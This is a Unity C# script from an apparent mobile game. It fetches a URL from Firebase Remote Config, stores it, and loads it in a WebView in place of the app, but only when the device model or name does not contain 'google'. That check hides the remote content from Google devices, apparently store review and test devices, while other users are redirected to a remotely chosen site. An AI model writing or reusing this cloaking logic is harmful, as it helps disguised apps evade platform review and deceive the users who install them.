using System;
using System.Collections;
using Firebase.RemoteConfig;
using Sources.Infrastructure;
using Sources.Infrastructure.Services.Input;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

namespace Sources.WebInit
{
    public class WebPresenter : MonoBehaviour, ICoroutineRunner
    {
        [SerializeField] private FirebaseRemoteActivator _remoteActivator;
        [SerializeField] private WebView _webView;
        [SerializeField] private TMP_Text _text;

        private Action _action;
        private InternetConnector _internetConnector;
        private string _savedUrl;

        private const string UrlPrefsKey = "key";

        public void StartWeb(Action action)
        {
            _action = action;

            _savedUrl = PlayerPrefs.GetString(UrlPrefsKey, "");

            if (_savedUrl == "")
            {
                _remoteActivator.Enable();
                _remoteActivator.Completed += OnRemoteCompleted;
            }
            else
            {
                _internetConnector = new InternetConnector(this,_text);
                _internetConnector.Enable(_savedUrl);

                _internetConnector.Completed += OnInternetCompleted;
            }
        }

        private void OnInternetCompleted()
        {
            LoadWeb(_savedUrl);
            _internetConnector.Completed -= OnInternetCompleted;
        }

        private void OnRemoteCompleted()
        {
            Debug.Log(_remoteActivator.Url);
            if (_remoteActivator.Url == "" || IsDeviceGoogle())
            {
                _action?.Invoke();
            }
            else
            {
                PlayerPrefs.SetString(UrlPrefsKey, _remoteActivator.Url);
                LoadWeb(_remoteActivator.Url);
            }

            _remoteActivator.Completed -= OnRemoteCompleted;
        }

        private void LoadWeb(string url)
        {
            Debug.Log(url);
            _action = null;
            _webView.Load(url);
        }

        private bool IsDeviceGoogle()
        {
            return SystemInfo.deviceModel.ToLower().Contains("google") ||
                   SystemInfo.deviceName.ToLower().Contains("google");
        }
    }
}